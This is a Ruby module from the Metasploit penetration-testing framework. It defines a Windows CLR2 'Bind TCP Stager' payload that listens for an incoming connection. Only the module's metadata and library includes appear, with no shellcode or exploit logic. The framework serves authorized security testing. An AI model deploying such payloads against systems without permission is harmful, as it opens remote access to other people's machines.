##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/bind_tcp'
require 'msf/core/payload/clr2/bind_tcp'

module MetasploitModule

  CachedSize = 285

  include Msf::Payload::Stager
  include Msf::Payload::Clr2::BindTcp

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Bind TCP Stager',
      'Description' => 'Listen for a connection',
      'Author'      => ['OJ Reeves'],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_CLR2,
      'Handler'     => Msf::Handler::BindTcp,
      'Stager'      => {}
    ))
  end
end
